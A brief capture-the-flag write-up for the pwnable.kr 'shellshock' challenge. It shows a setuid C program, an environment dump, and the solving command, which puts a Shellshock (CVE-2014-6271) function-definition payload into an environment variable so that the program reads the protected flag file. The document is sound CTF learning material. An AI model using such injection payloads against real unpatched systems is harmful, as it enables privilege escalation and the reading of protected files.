# Pwnable.kr Shellshock

Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)

# Files

```sh
shellshock@ubuntu:~$ ls
bash  flag  shellshock	shellshock.c
```
# shellshock.c
```sh
shellshock@ubuntu:~$ cat shellshock.c
```
```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```
# Environment
```sh
shellshock@ubuntu:~$ env
XDG_SESSION_ID=17578
TERM=xterm-256color
SHELL=/bin/bash
SSH_CLIENT=205.204.186.15 3763 22
SSH_TTY=/dev/pts/29
USER=shellshock
MAIL=/var/mail/shellshock
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
PWD=/home/shellshock
LANG=en_US.UTF-8
SHLVL=1
HOME=/home/shellshock
LANGUAGE=en_US:
LOGNAME=shellshock
SSH_CONNECTION=205.204.186.15 3763 192.168.1.186 22
XDG_RUNTIME_DIR=/run/user/1019
_=/usr/bin/env
```

# Note the space is required! 

```sh
shellshock@ubuntu:~$ env x="() { :; }; /bin/cat /home/shellshock/flag" ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
```